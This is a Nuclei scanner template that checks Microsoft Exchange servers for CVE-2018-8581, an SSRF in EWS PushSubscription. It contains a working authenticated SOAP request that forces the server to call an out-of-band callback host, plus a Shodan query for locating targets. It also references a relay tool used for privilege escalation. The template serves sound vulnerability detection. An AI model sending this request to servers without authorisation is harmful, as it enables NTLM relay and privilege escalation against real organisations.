http/cves/2018/CVE-2018-8581.yaml

id: CVE-2018-8581

info:
  name: Microsoft Exchange Server - SSRF via EWS PushSubscription (CVE-2018-8581)
  author: rajanarahul93
  severity: high
  description: |
    Microsoft Exchange Server is vulnerable to an SSRF primitive via EWS PushSubscription, which can be abused in
    certain configurations for privilege escalation (e.g., NTLM relay). This template validates SSRF behavior using OAST.
  impact: |
    Successful exploitation can allow attackers to relay authentication and potentially escalate privileges depending
    on environment configuration.
  remediation: |
    Apply Microsoft Exchange security updates addressing CVE-2018-8581.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2018-8581
    - https://github.com/Ridter/Exchange2domain
    - https://vulncheck.com/xdb/276c34c7f74f
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2018-8581
    cwe-id: CWE-918
  metadata:
    max-request: 2
    vendor: microsoft
    product: exchange_server
    shodan-query: cpe:"cpe:2.3:a:microsoft:exchange_server"
  tags: cve,cve2018,microsoft,exchange,ssrf,oast,ews,kev,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/EWS/Exchange.asmx"

    matchers-condition: and
    matchers:
      - type: regex
        part: header
        regex:
          - "(?i)X-Owa-Version:"

      - type: status
        status:
          - 401
          - 302

  - raw:
      - |
        POST /EWS/Exchange.asmx HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic {{base64(username + ":" + password)}}
        Content-Type: text/xml; charset=utf-8

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                       xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
                       xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
                       xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Header>
            <t:RequestServerVersion Version="Exchange2010" />
          </soap:Header>
          <soap:Body>
            <m:Subscribe>
              <m:PushSubscriptionRequest>
                <t:FolderIds>
                  <t:DistinguishedFolderId Id="inbox" />
                </t:FolderIds>
                <t:EventTypes>
                  <t:EventType>NewMailEvent</t:EventType>
                </t:EventTypes>
                <t:StatusFrequency>1</t:StatusFrequency>
                <t:URL>http://{{interactsh-url}}/ews-ssrf</t:URL>
              </m:PushSubscriptionRequest>
            </m:Subscribe>
          </soap:Body>
        </soap:Envelope>

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'contains(interactsh_protocol, "http")'
          - 'contains(interactsh_request, "/ews-ssrf")'
        condition: and

      - type: word
        part: body
        words:
          - "SubscribeResponse"
          - "ResponseClass=\"Success\""
          - "NoError"
        condition: and
